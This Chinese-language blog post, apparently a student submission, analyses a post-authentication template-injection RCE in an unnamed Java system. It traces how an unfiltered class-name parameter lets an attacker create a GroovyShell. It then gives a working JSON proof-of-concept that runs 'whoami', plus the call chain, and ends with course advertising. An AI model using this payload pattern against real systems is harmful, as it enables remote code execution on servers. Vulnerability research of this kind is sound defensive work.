---
title: 某系统存在Beetl反序列化模板注入RCE漏洞
url: https://mp.weixin.qq.com/s/ZMW8BxqPu1OqL0j5K-2VzA
source: Doonsec's feed
date: 2026-02-18
fetch_date: 2026-02-19T04:16:39.737071
---

# 某系统存在Beetl反序列化模板注入RCE漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Dfrm5V3o6kRIcx44CHgNKhSKhRlwWWKC5cY8p8DJ2JmFhibsxbm7yAaCJjAXGWNThH1rwuB3icEn6LXFb28micQic9rCNMKjibVr1tz62992Nh9M/0?wx_fmt=jpeg)

# 某系统存在Beetl反序列化模板注入RCE漏洞

学员投稿
学员投稿

进击安全

![]()

在小说阅读器中沉浸阅读

# **免责申明** 本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。

## 一、前言

由于这个是一个后台漏洞，所以不分析对应的鉴权关系，直接我们可以看对应的代码漏洞。

二、漏洞分析

对应漏洞位置。

```
xx.jar\com\dongbao\web\base\InitController.java
```

在该java文件当中发现了下述接口。

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT787XxAuEyCJpV92Rf3uJfFp6t26EVCAbJzhQtxuvlnoUUBiaPaEfEm4CzBQ51AHuJY6J35oKiay3FscbBA15f825jDxoJeW2Ww/640?wx_fmt=png&from=appmsg)

    跟进代码发现，利用底层函数获取beetStringGroupTemplate，获取到其对象gt。

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRqY5HZdGSEmtTzqpYMso5Z2S45d6ibT86emdkfZVqdFBkAIGRyuCCQiaZWSFq2icV29nmgb7YDDxHc2A3MHJJfolcxeaMcnCextg/640?wx_fmt=png&from=appmsg)

    获取json参数赋值给 param 和 paramTyoe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQGSspI8xVZbsqEsYchFktXM9SrFempD0lKriaKH5iaWiaaFSVic2iapFLUdM5264Q5eRn5C0WG5ZorbMfM1Zib0fzoJiaoan5eEBS6z8/640?wx_fmt=png&from=appmsg)

    然后param不为空，进入如下for循环。

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kShwcOm32fOmWzAMjMLOe8ibDm2kmL3y0mjRZpdIa8JAvQxdUibpbd1IgTspkDFVx9SD84K5Hvd63ZQmjqadsn5Z05JwHjVzMfQo/640?wx_fmt=png&from=appmsg)

    先获取到paramType的键值（也就是参数infoType），赋值给 propertyType，然后判断propertyType是否为空，不为空，就反射获取propertyType 的类（也就是paramType（也就是infoType）），然后只要 classType不包含 HashMap 关键字，就可以不进入if，然后就可以把classType传入 params，然后进入下述代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTLTdhPiaYrcH2Tia3uVzLO7rwvdmOV3uP5pmOuEUqHv3BF1LYEhWpUalcO4ycBPOTKzrndYssnM7EyTKczeJxxJhT80fqaiariaick/640?wx_fmt=png&from=appmsg)

传入params，code 到 runScript 函数执行，全程除了 Hashmap外，无过滤

构造poc

```
{"code":"var result = shell.evaluate('\"whoami\".execute().text'); return result;","param":{"shell":{}},"infoType":{"shell":"groovy.lang.GroovyShell"}}根据上面代码，
```

param 为 “shell”: {}，infoType即为paramType，为

```
"shell":"groovy.lang.GroovyShell"
```

此时,String propertyType = (String)paramType.get(k);，k值为 shell，paramType.get(k)的值为groovy.lang.GroovyShell，然后赋值给propertyType，此时propertyType 的值为 groovy.lang.GroovyShell

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT1p3hPDxAIqGsZyJ6OnicRNRUAZVnHS8tljsTXPtlLH8wwOZ2oQ63ww6SOyfiaCwvAmxpCiaAqu0JZ3A7ia0RkyT83hyTcOqar3hM/640?wx_fmt=png&from=appmsg)

    反射获取groovy.lang.GroovyShell.class，赋值给 classType

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRSdbfzhaaT2eibic41DQ0lnQIdVcxFPsQzPobPYZBgZFh7ydyJ0icDuVCs3TriapWoAXFQicGibLaJVjziaVMMwqXjiaoJ8mFwKP8TYvA/640?wx_fmt=png&from=appmsg)

    然后调用，TypeParseUtil.convert({}, groovy.lang.GroovyShell.class)跟进函数TypeParseUtil.convert()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSOrTzGXbMIBS9UaicjA2acZoGX74n1Xan49ibahV3XwG0O9UVGWFbl7iclslf0bvtlhW60nBIgvxiaKxeyAUXlDINNg8HeiagEpcH4/640?wx_fmt=png&from=appmsg)

    调用了JSONObject.toJavaObject({}, groovy.lang.GroovyShell.class)

    最终调用链

```
│ params.put(k, TypeParseUtil.convert(v, classType, null))│ ↓│ TypeParseUtil.convert({}, groovy.lang.GroovyShell.class)│ ↓│ JSONObject.toJavaObject({}, groovy.lang.GroovyShell.class)│ ↓│ new GroovyShell()  ← 创建了GroovyShell实例
```

最终执行效果为

GroovyShell.evaluate('"whoami".execute().text')

导致反序列化RCE。

三、漏洞复现

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSnBZSia9ZibBEicP1jgOFuqyeNDXYGr5mtianNQjmzoYsPtg8JLCpYn52DXBV2ibicfeukNY7yY8TKsQKDH3rC5sN6b1Dic50cxuWdbM/640?wx_fmt=png&from=appmsg)

   成功执行whoami命令。

**广告区域**

目前第四期进阶课程已经开始，课表如下：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWnO9eMTmk5VVbhFTVLxXia4jqS2iaCJ15VPYY4I0MqNdo32T3flbxyxMMW0hwc7yzyicschnpgDGpYQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=16)

同时报名第四期基础课程同样可看，课表如下：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWnO9eMTmk5VVbhFTVLxXia4n1Oz8NkOc9iaTZoFo8icSh5icPpsApB2A3ahLpHNcXBkoNgcqibDTUMBgg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=17)

同时具备内部资料以及靶场相关福利，想要了解的师傅可以冲了。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWnO9eMTmk5VVbhFTVLxXia4MRnfNlopYRJ1xcwpguV74bTe3l8fPCACxUOGicR9BN3SsOYWtWgotMQ/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=21)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWnO9eMTmk5VVbhFTVLxXia4ibiaWHuP6wheHNfH9znJyVQIbslJbbvNLWaFPpmA6YkpYicUfnJJsgia9A/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=22)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWnO9eMTmk5VVbhFTVLxXia4UILQauuRVdMl8DdtIykpSEnmZNLc1hRy6UWuAZqYFVH2Wl2ncVJyxQ/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZRKuxIKRyhVONQYJ0JqHiaReMdL4U96Os4cyUtkHlTE3MlhsRYqjMyXJ3ia1N3EwFOX1HFsmvoVGibXFKFKqLZicaw/0?wx_fmt=png)

进击安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZRKuxIKRyhVONQYJ0JqHiaReMdL4U96Os4cyUtkHlTE3MlhsRYqjMyXJ3ia1N3EwFOX1HFsmvoVGibXFKFKqLZicaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过